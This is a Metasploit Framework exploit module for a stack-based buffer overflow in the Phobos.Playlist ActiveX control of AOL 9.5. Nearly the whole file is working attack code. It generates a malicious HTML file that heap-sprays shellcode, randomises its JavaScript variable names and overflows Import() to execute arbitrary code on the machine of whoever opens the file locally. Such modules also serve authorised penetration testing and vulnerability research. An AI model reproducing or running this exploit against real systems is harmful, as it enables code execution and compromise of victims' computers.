##
# aol_phobos_bof.rb
#
# AOL 9.5 Phobos.Playlist 'Import()' Stack-based Buffer Overflow exploit for the Metasploit Framework
#
# Tested successfully on the following platforms:
#  - AOL 9.5 (Revision 4337.155) on Internet Explorer 7, Windows XP SP3
#
# Phobos.dll version tested:
# File Version: 9.5.0.1
# ClassID: A105BD70-BF56-4D10-BC91-41C88321F47C
# RegKey Safe for Script: False
# RegKey Safe for Init: False
# Implements IObjectSafety: False
# KillBitSet: False
#
# Due to the safe for initialization and safe for scripting settings of this ActiveX control, 
# exploitation is possible only from Local Machine Zone, which means the victim must run the 
# generated exploit file locally.
#
# Trancer
# http://www.rec-sec.com
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
	Rank = AverageRanking

	include Msf::Exploit::FILEFORMAT

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'AOL 9.5 Phobos.Playlist Import() Stack-based Buffer Overflow',
			'Description'    => %q{
				This module exploits a stack-based buffer overflow within Phobos.dll of AOL 9.5.
				By setting an overly long value to 'Import()', an attacker can overrun a buffer 
				and execute arbitrary code.
			},
			'License'        => MSF_LICENSE,
			'Author'         => [ 
						'Trancer <mtrancer[at]gmail.com>'
						], 
			'Version'        => '$Revision:$',
			'References'     => 
				[
					[ 'URL', 'http://www.exploit-db.com/exploits/11204' ],
					[ 'URL', 'http://www.rec-sec.com/2010/01/25/aol-playlist-class-buffer-overflow/' ],
				],
			'DefaultOptions' =>
				{
					'EXITFUNC' => 'process',
				},
			'Payload'        =>
				{
					'Space'         => 1024,
					'BadChars'      => "\x00\x09\x0a\x0d'\\",	
					'StackAdjustment' => -3500,
				},
			'Platform'       => 'win',
			'Targets'        =>
				[
					[ 'Windows XP SP0-SP3 / IE 6.0 SP0-2 & IE 7.0', { 'Ret' => 0x0C0C0C0C, 'Offset' => 1000 } ]	
				],
			'DisclosureDate' => 'Jan 20 2010',
			'DefaultTarget'  => 0))

			register_options(
				[
					OptString.new('FILENAME',   [ false, 'The file name.',  'msf.html']),
				], self.class)
	end

	def exploit

		# Encode the shellcode
		shellcode = Rex::Text.to_unescape(payload.encoded, Rex::Arch.endian(target.arch))

		# Setup exploit buffers
		nops 	  = Rex::Text.to_unescape([target.ret].pack('V'))
		ret  	  = Rex::Text.uri_encode([target.ret].pack('L'))
		blocksize = 0x40000
		fillto    = 500 
		offset 	  = target['Offset']
		
		# Randomize the javascript variable names
		phobos       = rand_text_alpha(rand(100) + 1)
		j_shellcode  = rand_text_alpha(rand(100) + 1)
		j_nops       = rand_text_alpha(rand(100) + 1)
		j_ret        = rand_text_alpha(rand(100) + 1)
		j_headersize = rand_text_alpha(rand(100) + 1)
		j_slackspace = rand_text_alpha(rand(100) + 1)
		j_fillblock  = rand_text_alpha(rand(100) + 1)
		j_block      = rand_text_alpha(rand(100) + 1)
		j_memory     = rand_text_alpha(rand(100) + 1)
		j_counter    = rand_text_alpha(rand(30) + 2)
		j_bla        = rand_text_alpha(rand(8) + 4)

		html = %Q|<html> 
<object classid='clsid:A105BD70-BF56-4D10-BC91-41C88321F47C' id='#{phobos}'></object>
<script>
#{j_shellcode}=unescape('#{shellcode}');
#{j_nops}=unescape('#{nops}');
#{j_headersize}=20;
#{j_slackspace}=#{j_headersize}+#{j_shellcode}.length;
while(#{j_nops}.length<#{j_slackspace})#{j_nops}+=#{j_nops};
#{j_fillblock}=#{j_nops}.substring(0,#{j_slackspace});
#{j_block}=#{j_nops}.substring(0,#{j_nops}.length-#{j_slackspace});
while(#{j_block}.length+#{j_slackspace}<#{blocksize})#{j_block}=#{j_block}+#{j_block}+#{j_fillblock};
#{j_memory}=new Array();
for(#{j_counter}=0;#{j_counter}<#{fillto};#{j_counter}++)#{j_memory}[#{j_counter}]=#{j_block}+#{j_shellcode};

var #{j_ret}='';
for(#{j_counter}=0;#{j_counter}<=#{offset};#{j_counter}++)#{j_ret}+=unescape('#{ret}');
#{phobos}.Import(#{j_ret},'#{j_bla}','True','True');
</script> 
</html>|

		print_status("Creating '#{datastore['FILENAME']}' file ...")

		file_create(html)
	end

end